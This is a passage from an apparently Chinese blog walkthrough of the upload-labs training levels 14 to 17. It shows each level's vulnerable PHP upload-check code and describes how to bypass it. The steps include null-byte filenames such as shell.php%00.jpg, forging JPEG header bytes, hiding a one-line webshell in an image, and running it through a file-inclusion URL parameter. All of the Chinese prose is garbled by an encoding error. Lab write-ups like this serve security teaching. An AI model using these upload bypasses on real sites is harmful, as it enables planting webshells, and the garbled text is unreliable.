è¯·æ±‚ä½“ä¸­ï¼ˆå¦‚è¡¨å•å­—æ®µ <code>filename=&quot;test.php%00.jpg&quot;</code>ï¼‰ã€‚</td></tr><tr><td align="left"><strong>å¸¸è§æ¼æ´åœºæ™¯</strong></td><td align="center">è·¯å¾„éå†ã€æ–‡ä»¶åŒ…å«ï¼ˆå¦‚ <code>include($_GET[&#39;file&#39;])</code>ï¼‰ã€‚</td><td align="center">æ–‡ä»¶ä¸Šä¼ ã€è·¯å¾„æ‹¼æ¥ï¼ˆå¦‚ <code>move_uploaded_file($tmp, $_POST[&#39;path&#39;].$filename)</code>ï¼‰ã€‚</td></tr><tr><td align="left"><strong>ç»•è¿‡ç¤ºä¾‹</strong></td><td align="center"><code>http://example.com?file=shell.php%00.jpg</code> â†’ æˆªæ–­ä¸º <code>shell.php</code>ã€‚</td><td align="center">ä¸Šä¼ æ–‡ä»¶å <code>shell.php\x00.jpg</code> â†’ ä¿å­˜ä¸º <code>shell.php</code>ã€‚</td></tr><tr><td align="left"><strong>é˜²å¾¡éš¾åº¦</strong></td><td align="center">è¾ƒéš¾è§¦å‘ï¼ˆéœ€æœåŠ¡å™¨å…è®¸ URL ä¸­åŒ…å«æœªç¼–ç çš„ <code>%00</code>ï¼‰ã€‚</td><td align="center">è¾ƒæ˜“è§¦å‘ï¼ˆè¯·æ±‚ä½“ä¸­çš„ç©ºå­—èŠ‚å¯èƒ½ç›´æ¥è¢«å¤„ç†ï¼‰ã€‚</td></tr><tr><td align="left"><strong>å®é™…åˆ©ç”¨é¢‘ç‡</strong></td><td align="center">è¾ƒä½ï¼ˆç°ä»£æ¡†æ¶&#x2F;æœåŠ¡å™¨é»˜è®¤è¿‡æ»¤ URL ä¸­çš„ç©ºå­—èŠ‚ï¼‰ã€‚</td><td align="center">è¾ƒé«˜ï¼ˆæ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ä¸­æ›´å¸¸è§ï¼Œä¸”ç©ºå­—èŠ‚å¯èƒ½ç»•è¿‡æ‰©å±•åæ£€æŸ¥ï¼‰ã€‚</td></tr></tbody></table><hr><h3 id="Pass-14-å›¾ç‰‡é©¬-æ–‡ä»¶åŒ…å«æ¼æ´"><a href="#Pass-14-å›¾ç‰‡é©¬-æ–‡ä»¶åŒ…å«æ¼æ´" class="headerlink" title="Pass-14_å›¾ç‰‡é©¬+æ–‡ä»¶åŒ…å«æ¼æ´"></a>Pass-14_å›¾ç‰‡é©¬+æ–‡ä»¶åŒ…å«æ¼æ´</h3><p>é¦–å…ˆåˆ†æä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getReailFileType</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&quot;rb&quot;</span>);<span class="hljs-comment">//ä½¿ç”¨fopen()å‡½æ•°ä»¥äºŒè¿›åˆ¶æ¨¡å¼ï¼ˆ&quot;rb&quot;ï¼‰æ‰“å¼€æŒ‡å®šçš„æ–‡ä»¶</span><br>    <span class="hljs-variable">$bin</span> = <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$file</span>, <span class="hljs-number">2</span>); <span class="hljs-comment">//åªè¯»2å­—èŠ‚ï¼Œè¿™é‡Œåªè¯»å–ä¸¤ä¸ªå­—èŠ‚æ˜¯å› ä¸ºä¸åŒçš„æ–‡ä»¶ç±»å‹é€šå¸¸åœ¨å…¶å¤´éƒ¨æœ‰ç‹¬ç‰¹çš„æ ‡è¯†ç¬¦ï¼ˆä¹Ÿç§°ä¸ºâ€œé­”æœ¯æ•°å­—â€ï¼‰ï¼Œè¿™äº›æ ‡è¯†ç¬¦è¶³ä»¥åŒºåˆ†å¸¸è§çš„æ–‡ä»¶æ ¼å¼</span><br>    <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$strInfo</span> = @<span class="hljs-title function_ invoke__">unpack</span>(<span class="hljs-string">&quot;C2chars&quot;</span>, <span class="hljs-variable">$bin</span>); <span class="hljs-comment">//å°†è¯»å–çš„2ä¸ªå­—èŠ‚è§£åŒ…ä¸ºä¸¤ä¸ªæ— ç¬¦å·å­—ç¬¦ï¼ˆC2chars è¡¨ç¤ºè§£åŒ…ä¸º2ä¸ªå­—ç¬¦ï¼‰ï¼›@ ç”¨äºæŠ‘åˆ¶å¯èƒ½çš„é”™è¯¯ï¼ˆå¦‚æ–‡ä»¶ä¸è¶³2å­—èŠ‚æ—¶è§£åŒ…å¤±è´¥ï¼‰   </span><br>    <span class="hljs-variable">$typeCode</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$strInfo</span>[<span class="hljs-string">&#x27;chars1&#x27;</span>].<span class="hljs-variable">$strInfo</span>[<span class="hljs-string">&#x27;chars2&#x27;</span>]); <span class="hljs-comment">//å°†ä¸¤ä¸ªå­—èŠ‚æ‹¼æ¥æˆä¸€ä¸ªæ•´æ•°   </span><br>    <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;&#x27;</span>;    <br>    <span class="hljs-keyword">switch</span>(<span class="hljs-variable">$typeCode</span>)&#123;  <span class="hljs-comment">//åŒ¹é…æ–‡ä»¶ç±»å‹    </span><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">255216</span>:            <br>            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;jpg&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">13780</span>:            <br>            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;png&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;        <br>        <span class="hljs-keyword">case</span> <span class="hljs-number">7173</span>:            <br>            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;gif&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:            <br>            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;unknown&#x27;</span>;<br>        &#125;    <br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$fileType</span>;<br>&#125;<br><br><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    <span class="hljs-variable">$file_type</span> = <span class="hljs-title function_ invoke__">getReailFileType</span>(<span class="hljs-variable">$temp_file</span>);<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$file_type</span> == <span class="hljs-string">&#x27;unknown&#x27;</span>)&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_type</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>))&#123;<br>            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;ä¸Šä¼ å‡ºé”™ï¼&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>æ–‡ä»¶å¤´å­—èŠ‚ä¸æ–‡ä»¶ç±»å‹çš„å¯¹åº”å…³ç³»ï¼š</strong></p><p>1.æ–‡å­—å¤´ï¼šæ–‡å­—å¤´æ˜¯æ–‡ä»¶å¼€å¤´çš„å‡ ä¸ªå­—èŠ‚ï¼Œç”¨æ¥æ ‡è¯†æ–‡ä»¶ç±»å‹</p><p>JPEG æ–‡ä»¶çš„å‰ä¸¤ä¸ªå­—èŠ‚æ˜¯ <code>FF D8</code>ã€‚</p><p>PNG æ–‡ä»¶çš„å‰ä¸¤ä¸ªå­—èŠ‚æ˜¯ <code>89 50</code>ã€‚</p><p>GIF æ–‡ä»¶çš„å‰ä¸¤ä¸ªå­—èŠ‚æ˜¯ <code>47 49</code>ã€‚ï¼ˆåå…­è¿›åˆ¶ï¼‰</p><p>2.å­—èŠ‚ï¼ˆByteï¼‰ï¼šè®¡ç®—æœºä¸­çš„æœ€å°å­˜å‚¨å•ä½</p><p>åå…­è¿›åˆ¶ï¼š<code>FF</code>ã€<code>D8</code></p><p>åè¿›åˆ¶ï¼š <code>255</code>ã€<code>216</code></p><p>äºŒè¿›åˆ¶ï¼š <code>11111111</code>ã€<code>11011000</code></p><p>ä»¥jpgæ–‡ä»¶ç±»å‹ä¸¾ä¾‹ï¼š</p><p>jpgæ–‡ä»¶å‰ä¿©ä¸ªå­—èŠ‚æ˜¯<code>FF D8</code>ï¼Œ  ä»£ç ä¸­é€šè¿‡ <code>unpack(&quot;C2chars&quot;, $bin)</code> å°†æ–‡ä»¶å¤´çš„ä¸¤ä¸ªå­—èŠ‚è§£åŒ…ï¼Œè§£åŒ…å<code>$strInfo[&#39;chars1&#39;] </code>æ˜¯ç¬¬ä¸€ä¸ªå­—èŠ‚ï¼ˆFFï¼Œå³ 255ï¼‰ï¼Œ<code>$strInfo[&#39;chars2&#39;]</code> æ˜¯ç¬¬äºŒä¸ªå­—èŠ‚ï¼ˆD8ï¼Œå³ 216ï¼‰ã€‚<br>é€šè¿‡ <code>intval($strInfo[&#39;chars1&#39;].$strInfo[&#39;chars2&#39;])</code> å°†ä¸¤ä¸ªåè¿›åˆ¶æ•°æ‹¼æ¥æˆä¸€ä¸ªæ•´æ•°ï¼Œå¾—åˆ° <code>255216</code>ã€‚æœ€åæ ¹æ®<code>switch($typeCode)</code>å‡½æ•°åŒ¹é…åˆ°jpgæ–‡ä»¶ã€‚</p><p> å› æ­¤æˆ‘ä»¬æ›´æ”¹ä¸Šä¼ çš„æ–‡ä»¶çš„æ–‡ä»¶å¤´ï¼š</p><p>åœ¨æœ€å‰é¢è¾“å…¥ä¸¤ä¸ªä»»æ„å­—æ¯ï¼Œæ–¹ä¾¿åé¢ä¿®æ”¹</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021945869.png"></p><p>ä½¿ç”¨010editoræ‰“å¼€ï¼Œæ‰“å¼€åå…­è¿›åˆ¶</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021945773.png"></p><p>å°†61,61æ”¹ä¸ºFF,D8</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021945070.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022105108.png"></p><p>ä¿å­˜åä¸Šä¼ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021952518.png"></p><p>ä¸Šä¼ åèšå‰‘è¿˜ä¸èƒ½é“¾æ¥</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022056819.png"></p><p>æ¥ä¸‹æ¥è¦ç”¨åˆ°æ–‡ä»¶åŒ…å«æ¼æ´</p><p><a href="https://blog.csdn.net/m0_46467017/article/details/126380415">æ–‡ä»¶åŒ…å«æ¼æ´å…¨é¢è¯¦è§£-CSDNåšå®¢</a></p><p>ç‚¹å‡»é¢˜ç›®ä¸­çš„æ–‡ä»¶åŒ…å«æ¼æ´é“¾æ¥</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021952122.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021952242.png"></p><p>åœ¨æ–°æ ‡ç­¾é¡µæ‰“å¼€å›¾ç‰‡æ‰¾åˆ°å›¾ç‰‡é“¾æ¥</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021952027.png"></p><p>è®°ä¸‹æ–‡ä»¶å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">upload/5420250209113757.jpg<br></code></pre></td></tr></table></figure><p>æ–‡ä»¶åŒ…å«æ¼æ´ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?file=upload/+æ–‡ä»¶åç§°<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?file=upload/5020250209113022.jpg<br></code></pre></td></tr></table></figure><p>é¡µé¢æ²¡æœ‰æŠ¥é”™ï¼Œå°±å¯ä»¥ç”¨è¿™ä¸ªurlé€šè¿‡èšå‰‘è¿æ¥</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022057235.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021953063.png"></p><p><code>.png</code>åç¼€ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021953187.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021953169.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021953548.png"></p><p><code>.gif</code>åç¼€ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021953865.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021953702.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021953596.png"></p><p>ä¸‰ç§åç¼€éƒ½ä¸Šä¼ æˆåŠŸæ‰ç®—è¿‡å…³ï¼</p><h3 id="Pass-15-å›¾ç‰‡é©¬"><a href="#Pass-15-å›¾ç‰‡é©¬" class="headerlink" title="Pass-15_å›¾ç‰‡é©¬"></a>Pass-15_å›¾ç‰‡é©¬</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isImage</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>&#123;<br>    <span class="hljs-variable">$types</span> = <span class="hljs-string">&#x27;.jpeg|.png|.gif&#x27;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filename</span>))&#123;<br>        <span class="hljs-variable">$info</span> = <span class="hljs-title function_ invoke__">getimagesize</span>(<span class="hljs-variable">$filename</span>);<br>        <span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">image_type_to_extension</span>(<span class="hljs-variable">$info</span>[<span class="hljs-number">2</span>]);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$types</span>,<span class="hljs-variable">$ext</span>)&gt;=<span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$ext</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">isImage</span>(<span class="hljs-variable">$temp_file</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$res</span>)&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-variable">$res</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>))&#123;<br>            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;ä¸Šä¼ å‡ºé”™ï¼&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸€å…³ä¸­å‡ºç°äº†<code>getimagesizeï¼ˆï¼‰</code>å‡½æ•°ï¼Œ<code>getimagesize()</code> æ˜¯ PHP ä¸­ä¸€ä¸ªç”¨äºè·å–å›¾åƒæ–‡ä»¶ä¿¡æ¯çš„å‡½æ•°ï¼Œå®ƒå¯ä»¥è¿”å›å›¾åƒçš„å°ºå¯¸ã€ç±»å‹ã€MIME ç±»å‹ç­‰ä¿¡æ¯ã€‚</p><p>å› æ­¤æˆ‘ä»¬éœ€è¦ä¸€å¼ å›¾ç‰‡ï¼Œå°†ä¸€å¥è¯æœ¨é©¬å†™å…¥å›¾ç‰‡é‡Œ</p><p>éšä¾¿æ‰“å¼€ä¸€å¼ å›¾ç‰‡ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021953083.png"></p><p>å°†ä¸€å¥è¯æœ¨é©¬å†™å…¥æœ€åï¼Œä¿å­˜åä¸Šä¼ ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022059295.png"></p><p>ä¸Šä¼ æˆåŠŸååŒpass-14</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021954792.png"></p><p><code>.png</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021954713.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021954964.png"></p><h3 id="Pass-16-å›¾ç‰‡é©¬"><a href="#Pass-16-å›¾ç‰‡é©¬" class="headerlink" title="Pass-16-å›¾ç‰‡é©¬"></a>Pass-16-å›¾ç‰‡é©¬</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isImage</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>&#123;<br>    <span class="hljs-comment">//éœ€è¦å¼€å¯php_exifæ¨¡å—</span><br>    <span class="hljs-variable">$image_type</span> = <span class="hljs-title function_ invoke__">exif_imagetype</span>(<span class="hljs-variable">$filename</span>);<br>    <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$image_type</span>) &#123;<br>        <span class="hljs-keyword">case</span> IMAGETYPE_GIF:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;gif&quot;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> IMAGETYPE_JPEG:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;jpg&quot;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> IMAGETYPE_PNG:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;png&quot;</span>;<br>            <span class="hljs-keyword">break</span>;    <br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">isImage</span>(<span class="hljs-variable">$temp_file</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$res</span>)&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$res</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>))&#123;<br>            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;ä¸Šä¼ å‡ºé”™ï¼&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä»£ç ä¸­è¦æ±‚å¼€å¯php_exlf</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021954919.png"></p><p>æ¥ä¸‹æ¥åŒpass15</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021954934.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021954088.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021954813.png"></p><h3 id="Pass-17-äºŒæ¬¡æ¸²æŸ“"><a href="#Pass-17-äºŒæ¬¡æ¸²æŸ“" class="headerlink" title="Pass-17_äºŒæ¬¡æ¸²æŸ“"></a>Pass-17_äºŒæ¬¡æ¸²æŸ“</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-comment">// è·å¾—ä¸Šä¼ æ–‡ä»¶çš„åŸºæœ¬ä¿¡æ¯ï¼Œæ–‡ä»¶åï¼Œç±»å‹ï¼Œå¤§å°ï¼Œä¸´æ—¶æ–‡ä»¶è·¯å¾„</span><br>    <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>    <span class="hljs-variable">$filetype</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>];<br>    <span class="hljs-variable">$tmpname</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br><br>    <span class="hljs-variable">$target_path</span>=UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$filename</span>);<br><br>    <span class="hljs-comment">// è·å¾—ä¸Šä¼ 